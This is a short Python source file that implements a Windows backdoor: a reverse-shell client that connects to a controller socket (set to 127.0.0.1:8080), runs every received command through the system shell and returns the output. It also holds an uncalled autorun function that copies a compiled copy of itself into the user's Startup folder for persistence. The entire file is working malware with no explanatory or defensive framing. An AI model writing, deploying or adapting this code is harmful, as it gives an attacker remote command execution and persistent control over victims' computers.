import socket
import sys
import subprocess
import os


def autorun():
    file = os.path.basename(__file__)
    exe_file = file.replace('.py', '.exe')
    os.system(r'copy {} \"%APPDATA%\\Microsoft\Windows\\Start Menu\\Programs\\Startup\"'.format(exe_file))


host = '127.0.0.1'
port = 8080

try:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
except Exception as e:
    sys.exit()

while True:
    try:
        comm = client.recv(1024).decode()
        if comm == '\kill':
            break
        else:
            output = subprocess.check_output(comm, stderr=subprocess.STDOUT, shell=True, text=True)
            client.send(output.encode())
    except subprocess.CalledProcessError as e:
        error_msg = f'Error, excuting command: {comm}\n{e}'
        client.send(error_msg.encode())
        

client.close()
